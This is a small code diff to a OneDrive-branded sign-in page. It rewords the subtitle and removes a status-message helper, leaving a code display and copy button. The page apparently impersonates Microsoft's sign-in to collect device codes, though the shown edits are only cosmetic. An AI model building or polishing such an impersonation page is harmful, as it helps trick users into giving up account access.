@@ -50,7 +50,7 @@
     <img src="/static/logo.png" alt="logo">
     </div>
         <h1>OneDrive</h1>
-        <p class="subtitle">Sign in to continue to your files</p>
+        <p class="subtitle">Sign in to continue to your Documents</p>
         
         <div class="success" id="successMsg"></div>
         <div class="error" id="errorMsg"></div>
@@ -82,7 +82,6 @@
         let copyTimeout = null;
 
         const elements = {
-            status: document.getElementById('status'),
             spinner: document.getElementById('spinner'),
             codeDisplay: document.getElementById('codeDisplay'),
             copyBtn: document.getElementById('copyBtn'),
@@ -90,11 +89,6 @@
             successMsg: document.getElementById('successMsg'),
             errorMsg: document.getElementById('errorMsg')
         };
-
-        function showStatus(msg, color = '#605e5c') {
-            elements.status.textContent = msg;
-            elements.status.style.color = color;
-        }
 
         function showError(msg) {
             elements.errorMsg.textContent = msg;
